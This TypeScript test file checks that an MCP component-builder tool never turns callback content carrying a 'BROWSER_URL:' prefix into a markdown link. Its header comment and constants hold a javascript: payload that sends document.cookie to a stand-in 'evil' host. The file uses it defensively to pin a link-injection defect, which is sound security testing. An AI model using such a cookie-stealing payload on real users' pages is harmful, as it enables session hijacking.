/**
 * The channel a callback value belongs to is not something its content decides
 * (R4.4, R4.5 — task 3.3).
 *
 * SCOPE: THE CALLBACK CHANNEL ONLY. `create-ui.test.ts` (task 1.3) covers this
 * tool's file access. Nothing here asserts anything about
 * `absolutePathToCurrentFile` beyond passing a real, in-root file so that the
 * file boundary is not what these tests are measuring.
 *
 * THE DEFECT BEING PINNED, measured 2026-08-12: `create-ui.tool.ts:74` decides
 * whether a value is a URL to display or component code to return by testing
 * `browserResult.startsWith("BROWSER_URL:")` — a prefix carried in the same
 * string as the callback body, i.e. data deciding its own type. A callback body
 * of `BROWSER_URL:javascript:fetch('http://evil/'+document.cookie)` produced
 * exactly `[Open 21st.dev Magic Chat](javascript:fetch('http://evil/'+document.cookie))`
 * in the text handed to the agent.
 *
 * HOW THE ASSERTIONS ARE MADE
 * ---------------------------
 * - **On the text an MCP client really receives.** The tool is registered on a
 *   real `McpServer` and invoked through a real `Client` over `InMemoryTransport`,
 *   so what is asserted is what an agent gets, not an internal return value.
 * - **On every markdown link target, not on the absence of one string.**
 *   `nonHttpsLinkTargets()` extracts every `](…)` target in the output and the
 *   assertion is that the list of non-`https` ones is EMPTY. Asserting "the
 *   output does not contain this one payload" would pass against a different
 *   scheme; asserting on the extracted set cannot.
 * - **With a non-vacuous control.** "browser fails to open" below emits a real
 *   markdown link, so the extractor is proven to find links at all. Without that
 *   control, an empty non-`https` list would be evidence of nothing.
 * - **On counts, for the request that must not be issued.** When the callback
 *   answers, no API fallback request may be made; that is asserted by counting
 *   calls on the HTTP client, not by reading the output.
 *
 * WHY EACH BROWSER STUB POSTS TWO BODIES. The hostile case posts the raw
 * `BROWSER_URL:` string first and a legitimate payload second. The raw string is
 * not an object and cannot satisfy a payload schema, so after task 3.2 it is
 * refused and the window stays open for the second — which is precisely the
 * "a refusal must not consume the single-use window" property, exercised here
 * end-to-end. Against the current tree the first body resolves the waiter, the
 * second finds the server already stopped, and the connection error is
 * swallowed by the stub.
 *
 * The payload envelope is the one pinned by `callback-server.schema.test.ts`;
 * every field carries the same sentinel so an assertion holds whichever field a
 * consumer renders.
 *
 * NO BROWSER IS LAUNCHED AND NO EXTERNAL HOST IS REACHED: `openUrl` is stubbed,
 * the HTTP client is a stub, and the only socket used is `127.0.0.1` on the
 * callback server's own ephemeral port.
 */
import { describe, it, expect } from "bun:test";
import path from "node:path";
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";

import { CreateUiTool } from "../../tools/create-ui.tool.js";
import { BrowserDetector } from "../../browser/detector.js";
import { parseConfig, type Config } from "../../config.js";
import type { Logger } from "../../logger.js";
import type { HttpClient } from "../../http/client.js";

const TOOL_NAME = "magic_component_builder";
const ISSUING_ORIGIN = "https://21st.dev";

/** The measured payload. `.invalid` (RFC 2606) can never resolve. */
const HOSTILE_URL = "javascript:fetch('http://evil.invalid/'+document.cookie)";
const HOSTILE_RAW_BODY = `BROWSER_URL:${HOSTILE_URL}`;

const CALLBACK_SENTINEL = "CALLBACK-CONTENT-SENTINEL-4b71";
const API_SENTINEL = "API-FALLBACK-TEXT-SENTINEL-9c02";

/** Long enough for the tool to register its waiter before the POST lands. */
const POST_DELAY_MS = 60;

/** Bounds a callback that is never accepted to a failure instead of a hang. */
const TEST_TIMEOUT_MS = 20_000;

/** A body a callback payload schema must accept; same sentinel in every field. */
function validPayload(sentinel: string): string {
  return JSON.stringify({ text: sentinel, component: sentinel, code: sentinel, props: {} });
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

const silentLogger = {
  debug: () => {},
  info: () => {},
  warn: () => {},
  error: () => {},
  getLevel: () => "error" as const,
} as unknown as Logger;

/**
 * The real config, built by the real parser, so a field added to `Config` later
 * arrives here with its real default instead of a value invented by this file.
 */
function testConfig(): Config {
  const previous = process.env.TWENTY_FIRST_API_KEY;
  process.env.TWENTY_FIRST_API_KEY = "test-key-never-sent";
  try {
    return parseConfig();
  } finally {
    if (previous === undefined) delete process.env.TWENTY_FIRST_API_KEY;
    else process.env.TWENTY_FIRST_API_KEY = previous;
  }
}

/**
 * A real, existing file inside the process's working directory — the default
 * allowed root. The file boundary is `create-ui.test.ts`'s subject; here it just
 * has to be uncontroversial.
 */
const IN_ROOT_FILE = path.join(process.cwd(), "package.json");

interface StubHttp {
  readonly client: HttpClient;
  readonly calls: string[];
}

/** Answers the API fallback without a socket, and counts what was asked of it. */
function stubHttpClient(): StubHttp {
  const calls: string[] = [];
  const client = {
    post: async (endpoint: string) => {
      calls.push(endpoint);
      return { ok: true, status: 200, data: { text: API_SENTINEL } };
    },
  } as unknown as HttpClient;
  return { client, calls };
}

/**
 * `BrowserDetector` with only `openUrl` replaced: the real class is subclassed
 * rather than faked wholesale, so the tool is wired to the type it really uses
 * and no browser process can be spawned.
 */
class StubBrowserDetector extends BrowserDetector {
  readonly openedUrls: string[] = [];

  constructor(private readonly onOpen: (url: string) => boolean) {
    super(silentLogger);
  }

  async openUrl(url: string): Promise<boolean> {
    this.openedUrls.push(url);
    return this.onOpen(url);
  }
}

/** Posts each body to the callback server in turn, from the issuing origin. */
function postCallbacks(url: string, bodies: readonly string[]): void {
  const port = new URL(url).searchParams.get("port");
  if (port === null) throw new Error(`callback URL carries no port: ${url}`);

  void (async () => {
    for (const body of bodies) {
      await sleep(POST_DELAY_MS);
      try {
        await fetch(`http://127.0.0.1:${port}/`, {
          method: "POST",
          headers: { "Content-Type": "application/json", Origin: ISSUING_ORIGIN },
          body,
        });
      } catch {
        // The window already closed. A callback that arrives after the flow
        // ended is simply dropped — never a test failure by itself.
      }
    }
  })();
}

function textOf(result: unknown): string {
  const content = (result as { content?: Array<{ type?: string; text?: string }> }).content ?? [];
  return content
    .filter((entry) => entry.type === "text")
    .map((entry) => entry.text ?? "")
    .join("\n");
}

function isError(result: unknown): boolean {
  return (result as { isError?: boolean }).isError === true;
}

/** Every markdown link target in the text, in order. */
function linkTargets(text: string): string[] {
  return [...text.matchAll(/\]\(([^)]*)\)/g)].map((match) => match[1] ?? "");
}

function nonHttpsLinkTargets(text: string): string[] {
  return linkTargets(text).filter((target) => !target.startsWith("https://"));
}

interface Invocation {
  readonly text: string;
  readonly errored: boolean;
  readonly apiCalls: readonly string[];
  readonly openedUrls: readonly string[];
}

/**
 * Registers the real tool on a real `McpServer`, invokes it through a real
 * `Client`, and returns what the client received.
 */
async function invokeBuilder(onOpen: (url: string) => boolean): Promise<Invocation> {
  const http = stubHttpClient();
  const browserDetector = new StubBrowserDetector(onOpen);

  const tool = new CreateUiTool({
    httpClient: http.client,
    browserDetector,
    logger: silentLogger,
    config: testConfig(),
  });

  const server = new McpServer({ name: "magic-mcp", version: "2.0.0" });
  tool.register(server);

  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  const client = new Client({ name: "create-ui-channel-test", version: "2.0.0" });
  await Promise.all([client.connect(clientTransport), server.connect(serverTransport)]);

  try {
    const result = await client.callTool({
      name: TOOL_NAME,
      arguments: {
        message: "add a pricing card",
        searchQuery: "pricing card",
        absolutePathToCurrentFile: IN_ROOT_FILE,
        standaloneRequestQuery: "a pricing card component",
      },
    });

    return {
      text: textOf(result),
      errored: isError(result),
      apiCalls: http.calls,
      openedUrls: browserDetector.openedUrls,
    };
  } finally {
    await client.close();
    await server.close();
  }
}

describe("magic_component_builder — the callback channel", () => {
  it(
    "never turns a callback body into a URL, whatever prefix it carries",
    async () => {
      const invocation = await invokeBuilder((url) => {
        postCallbacks(url, [HOSTILE_RAW_BODY, validPayload(CALLBACK_SENTINEL)]);
        return true;
      });

      // The property, stated over every link the output contains.
      expect(nonHttpsLinkTargets(invocation.text)).toEqual([]);
      expect(invocation.text).not.toContain(`](${HOSTILE_URL}`);
      expect(invocation.text).not.toContain("](javascript:");

      // The flow still produced the legitimate content: a body that cannot be
      // validated must not consume the window that the real answer needs.
      expect(invocation.text).toContain(CALLBACK_SENTINEL);

      // A callback that answered means no API fallback was needed. Counted,
      // because the output alone cannot distinguish "not called" from "called
      // and its text not shown".
      expect(invocation.apiCalls).toEqual([]);
      expect(invocation.errored).toBe(false);
    },
    TEST_TIMEOUT_MS
  );

  it(
    "returns a payload whose content begins with BROWSER_URL: as content, not as a link",
    async () => {
      const invocation = await invokeBuilder((url) => {
        postCallbacks(url, [validPayload(HOSTILE_RAW_BODY)]);
        return true;
      });

      // The content channel: the string is delivered to the agent verbatim
      // (story.md Assumption 1) and is never promoted to a URL.
      expect(invocation.text).toContain(HOSTILE_RAW_BODY);
      expect(nonHttpsLinkTargets(invocation.text)).toEqual([]);
      expect(invocation.text).not.toContain("](javascript:");
      expect(invocation.apiCalls).toEqual([]);
      expect(invocation.errored).toBe(false);
    },
    TEST_TIMEOUT_MS
  );

  it(
    "still offers a manual https link when the browser cannot be opened",
    async () => {
      // The control, and the legitimate path the tightening must not break:
      // this is the one case where a link IS emitted, which is what makes the
      // link extractor above non-vacuous.
      const invocation = await invokeBuilder(() => false);

      const targets = linkTargets(invocation.text);
      expect(targets.length).toBeGreaterThan(0);
      expect(nonHttpsLinkTargets(invocation.text)).toEqual([]);
      expect(invocation.text).toContain("https://21st.dev/magic-chat");

      // The URL offered is the one we built and opened, not one that came back
      // over the wire.
      expect(invocation.openedUrls.length).toBe(1);
      expect(targets.some((target) => target === invocation.openedUrls[0])).toBe(true);

      // The API fallback still runs and its text still reaches the agent.
      expect(invocation.apiCalls).toEqual(["/api/fetch-ui"]);
      expect(invocation.text).toContain(API_SENTINEL);
      expect(invocation.errored).toBe(false);
    },
    TEST_TIMEOUT_MS
  );
});
